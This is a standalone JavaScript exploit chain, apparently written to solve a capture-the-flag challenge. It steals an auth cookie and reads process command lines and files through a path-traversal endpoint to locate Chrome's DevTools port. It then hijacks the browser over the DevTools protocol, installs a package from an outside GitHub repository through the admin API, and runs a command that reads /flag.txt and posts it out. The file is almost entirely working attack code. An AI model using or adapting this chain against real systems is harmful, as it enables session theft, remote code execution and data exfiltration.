(async()=>{
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return await r.text();
 }catch(e){return ''}
};
const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
post('cdp chain start');
post(ck?'cookie ok':'cookie none');

let devtools='';
for(let pid=1;pid<5000&&!devtools;pid++){
 let c=await read('/proc/'+pid+'/cmdline');
 if(!/chrome|chromium/i.test(c))continue;
 if(c.includes('--type=zygote')||c.includes('--type=gpu')||c.includes('--type=utility'))continue;
 let m=c.match(/--user-data-dir=(.*?)(?:\.--|$)/);
 if(!m)continue;
 let dir=m[1];
 post('chrome '+pid);
 post('udir '+dir.slice(0,80));
 let d=await read(dir+'/DevToolsActivePort');
 let q=d.match(/(\d+)\.?(\/devtools\/browser\/[A-Za-z0-9-]+)/);
 if(q)devtools='ws://localhost:'+q[1]+q[2];
}
if(!devtools){post('devtools none');return}
post('devtools found');

const adminStage=`(async()=>{
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const repo={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
const api=async(p,d)=>{
 let f=new FormData();
 f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
 f.append('__json__',JSON.stringify(d));
 let r=await fetch(p,{method:'POST',body:f});
 let t=await r.text().catch(()=>'');
 return p+' '+r.status+' '+t.slice(0,80);
};
await sleep(1500);
let meta=document.querySelector('meta[name=csrf]');
if(!meta)return 'csrf none '+location.href;
let a=await api('/_api/package-manager/add-repository',repo).catch(e=>'add err '+e.name+' '+e.message);
let b=await api('/_api/package-manager/install',{package:'2ash1/static'}).catch(e=>'install err '+e.name+' '+e.message);
await sleep(2000);
let ck=decodeURIComponent(location.hash.slice(1));
let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
return a+' | '+b;
})()`;

let ws=new WebSocket(devtools);
let id=0,waits={};
const send=(method,params={},sid='')=>new Promise((res,rej)=>{
 let n=++id;
 waits[n]=res;
 ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
 setTimeout(()=>rej(new Error('timeout '+method)),8000);
});
ws.onerror=()=>post('ws error');
ws.onmessage=e=>{
 let m=JSON.parse(e.data);
 if(m.id&&waits[m.id]){
  waits[m.id](m);
  delete waits[m.id];
 }
};
ws.onopen=async()=>{
 try{
  post('ws open');
  let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
  let targetId=t.result.targetId;
  post('target ok');
  let a=await send('Target.attachToTarget',{targetId,flatten:true});
  let sid=a.result.sessionId;
  post('attach ok');
  await sleep(5000);
  let r=await send('Runtime.evaluate',{expression:adminStage,awaitPromise:true,returnByValue:true},sid);
  let v=((r.result||{}).result||{}).value||'eval sent';
  post('eval '+String(v).slice(0,300));
 }catch(e){
  post('cdp err '+e.message);
 }
};
})();
